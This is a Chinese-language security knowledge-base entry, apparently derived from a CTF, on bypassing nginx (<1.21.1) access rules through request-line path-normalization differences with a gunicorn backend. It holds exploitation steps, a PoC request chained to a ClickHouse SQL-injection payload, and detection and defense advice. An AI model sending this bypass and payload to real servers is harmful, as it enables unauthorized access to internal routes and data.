---
id: web-generic-auth-nginx-request-line-path-normalization-bypass
title: nginx 1.21.1 前请求行路径解析差异：/query HTTP/1.1/../../api/ping 让前端看到 /api/ping、后端路由到 /query
type: scenario
domain: web
path: web/generic/auth
technique: nginx-request-line-uri-normalization-differential
aliases:
- nginx 请求行绕过
- nginx 路径解析差异
- HTTP/1.1/../.. 绕过
- nginx+gunicorn 路径绕过
- 请求行注入路径穿越
- nginx 1.21.1 路径
affected_versions: nginx < 1.21.1
tags:
- web
- nginx
- gunicorn
- access-control
- bypass
- path-normalization
- routing
- ctf
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V569
  verified_at: '2026-11-12T09:28:49+08:00'
  notes: 已对照原文与截图14/15核对：POST /query HTTP/1.1/../../api/ping HTTP/1.1 在 nginx/1.21.0 实测返回 200 ok（Query 处理器），版本条件 nginx<1.21.1 与原文引用截图一致，对照案例 /aaa/bbb/../../ccc 与 /private<TAB>HTTP/1.1/../../public 亦一致。具体解析机制未独立复现，依赖原文引用资料。
---

## 一句话结论

在 nginx 反向代理 + gunicorn/WSGI 后端的架构中，把 `HTTP/1.1/../..` 嵌进请求行路径（如 `POST /query HTTP/1.1/../../api/ping HTTP/1.1`），可让 nginx 按 `../` 归约后看到的是被代理/放行的 location（如 `/api/ping`），而后端按第一段真实路由 `/query` 执行，从而访问未对外暴露的内部路由。

## 原理

- HTTP 请求行本应是 `method SP request-target SP version`，但 nginx 1.21.1 之前的解析允许 request-target 中出现类似版本号与 `../` 的组合，并在匹配 location 前对路径做 `..` 段归约。
- 原文引用的对照案例：传入 `/aaa/bbb/../../ccc` 时，nginx 归约后"实际看到的是访问 `/ccc`"；类似的 `/private<TAB>HTTP/1.1/../../public` 中，nginx 看到的是 `/public`（可放行），而后端看到的是 `/private`（真实目标）。
- 本题中 nginx 只对外代理部分路径；`POST /query HTTP/1.1/../../api/ping HTTP/1.1` 让 nginx 归约出可代理的 `/api/ping`，而后端 gunicorn/web.py 按自己的解析取 `/query` 路由执行，返回 Query 处理器的 `ok`，SQL 注入因此可达。
- 本质是**前端代理与后端应用对同一请求行的 URI 解析/规范化不一致**：nginx 用归约后的路径做 location 匹配，后端用另一段做路由，二者都"合法"，但指向不同资源。

## 触发条件

- nginx < 1.21.1（原文标注；更高版本对请求行解析收紧）；
- nginx 只代理/放行部分 location，而后端存在未通过 nginx 暴露的路由；
- 后端框架会对路径做 `..` 规范化或按首段路由（gunicorn + web.py 等）；
- 请求行可被任意构造（无中间设备规范化）。

## 利用步骤

1. 探测正常路径，确认 nginx 只放行部分前缀（如仅 `/api/`），目标内部路由（如 `/query`）直连返回 404。
2. 构造请求行：`POST /query HTTP/1.1/../../api/ping HTTP/1.1`，body 放真实业务参数（如 SQL 注入 payload），发送。
3. 观察响应：返回内部路由（Query）的结果而非 404，说明绕过成功。
4. 把该请求行作为所有后续利用请求的入口（本例用于打 ClickHouse SQL 注入）。

## PoC

```http
POST /query HTTP/1.1/../../api/ping HTTP/1.1
Host: target:8013
Content-Type: application/x-www-form-urlencoded
Content-Length: 176

id=1 and (SELECT * FROM url('http://...', 'TabSeparatedRaw', 'x String'));
```

响应为后端 `/query` 路由的 `ok`，证明 nginx 侧看到的可放行路径与后端实际路由不一致。

## 变体与关联

- 变体：`/private<TAB>HTTP/1.1/../../public` 的反向组合（nginx 看到 `/public`、后端看到 `/private`）可用于访问被 nginx 拒绝的路径。
- 关联：nginx 与后端 Unicode 字符解析差异 [[web-generic-auth-nginx-exact-location-deny-trim-bypass]]、[[web-generic-auth-nginx-regex-deny-unicode-byte-bypass]]（同类"解析器差异"，字符型 vs 路径段型）；请求走私类 [[web-generic-http-smuggling]]（同为前端/后端解析不一致，但目标是绕过 ACL/投毒缓存）。
- 关联：作为 ClickHouse SQL 注入链的入口跳跃，见 [[web-generic-ssrf-clickhouse-sqli-url-function-multistep-relay]]。

## 检测与防御

- 检测：访问日志中请求行出现 `HTTP/1.1/../`、`..%2f` 与版本串组合；同一连接中 nginx 记录的 URI 与后端记录的路径不一致；对 4xx/200 异常路由的审计。
- 防御：升级 nginx 至 1.21.1+；用 `merge_slashes`/严格 location 与后端路由表对齐；在 nginx 层拒绝含多余空格、`../` 段的请求行；后端不依赖前端做唯一的路由安全决策，对内部路由加认证。
